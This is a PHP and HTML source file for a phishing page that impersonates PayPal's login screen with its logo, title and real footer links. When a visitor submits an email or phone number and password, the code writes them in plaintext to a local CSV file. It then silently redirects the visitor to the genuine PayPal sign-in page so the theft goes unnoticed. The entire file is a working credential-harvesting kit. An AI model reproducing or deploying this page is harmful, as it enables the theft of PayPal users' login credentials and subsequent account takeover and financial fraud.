<?php

    $login_id= $password="";
    $login_id_empty= $password_empty="";
     
    if($_SERVER["REQUEST_METHOD"]=="POST")
    {
        if(empty($_POST["login_id"]) || empty($_POST["password"]))
        {
            if(empty($_POST["login_id"]))
            $login_id_empty="Required.";
            
            if(empty($_POST["password"]))
            $password_empty="Required.";
        }
        else
        {
            $login_id=htmlspecialchars($_POST["login_id"]);
            $password=htmlspecialchars($_POST["password"]);

            if(filter_var($login_id,FILTER_VALIDATE_EMAIL) or preg_match("/^[0-9]{10}+$/",$login_id))
            {
                $csv_file=fopen("login_detail.csv","a");

                // to be run only the first time
                // fwrite($csv_file, "Email/Phone_number");
                // fwrite($csv_file, ",");
                // fwrite($csv_file, "Password");

                fwrite($csv_file, "\n");
                fwrite($csv_file, $login_id);
                fwrite($csv_file, ",");
                fwrite($csv_file, $password);
                header("Refresh:0; url=https://www.paypal.com/signin");
            }
            else
            {
                $login_id_empty="Please check your entry and try again.";
            }
        }

    }

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>PayPal</title>
</head>
<body>
    <div class="container">
        <img src="logo.png" alt="PayPal_logo">
        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <input type="text" placeholder="Email or mobile number" name="login_id" class="u_input">
            <div class="error"><?php echo $login_id_empty; ?></div>
            <input type="password" placeholder="Password" name="password" class="u_input">
            <div class="error"><?php echo $password_empty; ?></div>
            <a href="https://www.paypal.com/authflow/password-recovery/?country.x=IN&locale.x=en_GB&redirectUri=%252Fsignin%252F" class="f_pass">Forgotten password?</a>
            <input type="submit" value="Log In" id="submit">
            <p>or</p>
            <button id="signup" onclick="location.href('https://www.paypal.com/in/webapps/mpp/account-selection');">Sign Up</button>
        </form>
    </div>
    <footer>
        <a href="https://www.paypal.com/in/smarthelp/contact-us">Contact Us</a>
        <a href="https://www.paypal.com/in/legalhub/privacy-full">Privacy</a>
        <a href="https://www.paypal.com/in/legalhub/home">Legal</a>
        <a href="https://www.paypal.com/in/webapps/mpp/country-worldwide">Worldwide</a>
    </footer>
</body>
</html>